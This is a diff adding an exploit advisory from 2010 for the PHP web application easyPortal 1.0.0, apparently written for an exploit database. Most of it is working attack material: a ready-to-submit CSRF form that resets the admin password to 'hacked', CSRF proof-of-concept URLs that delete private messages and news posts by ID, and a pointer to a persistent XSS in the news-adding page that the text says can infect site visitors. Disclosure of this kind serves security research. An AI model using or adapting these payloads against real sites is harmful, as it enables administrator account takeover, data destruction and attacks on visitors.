@@ -1,0 +1,61 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 02. January 2010.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: easyPortal
+[#] Version: 1.0.0
+[#] Platform: PHP
+[#] Homepage: http://www.eazyportal.com/
+[#] Vulnerability: Multiple XSRF Vulnerabilities And Persistent XSS
+[#-----------------------------------------------------------------------------------------------#]
+ 
+[#]Content
+ |--Change admin password
+ |--Add news - Persistent XSS
+ |--Remove private message by id
+ |--Remove news by id
+ 
+[*]Change admin password
+ 
+[EXPLOIT------------------------------------------------------------------------------------------]
+&lt;form action=&quot;http://host/&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;a&quot; value=&quot;profile&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;uname&quot; value=&quot;admin&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;uavatar&quot; value=&quot;&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;uemail&quot;  value=&quot;e@mail.com&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;upwd&quot; value=&quot;hacked&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;ucpwd&quot; value=&quot;hacked&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;ulocation&quot; value=&quot;moon&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;usignature&quot; value=&quot;free your mind and the
+ass will follow&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;ushowemail&quot; value=&quot;0&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;ugmt&quot; value=&quot;0&quot;/&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;ufile&quot;/&gt;
+  &lt;input type=&quot;image&quot;
+src=&quot;http://host/tpl/DefaultGreen/img/button_submit.gif&quot;
+name=&quot;submit&quot;/&gt;
+&lt;/form&gt;
+[EXPLOIT------------------------------------------------------------------------------------------]
+ 
+[+]Add news - Persistent XSS
+ 
+http://host/index.php?a=administrator&amp;p=news&amp;s=add
+ 
+There we can add new news that can be seen on main page. It is
+vulnerable to persistent xss and
+attacker can use this to infect website visitors.
+ 
+[-]Remove private message by id
+ 
+[POC----------------------------------------------------------------------------------------------]
+http://host/index.php?a=private&amp;inbox=&amp;d=[ID]
+[POC----------------------------------------------------------------------------------------------]
+ 
+[-]Remove news by id
+ 
+[POC----------------------------------------------------------------------------------------------]
+http://host/index.php?a=administrator&amp;p=news&amp;del=[ID]
+[POC----------------------------------------------------------------------------------------------]
+ 
+[#] EOF
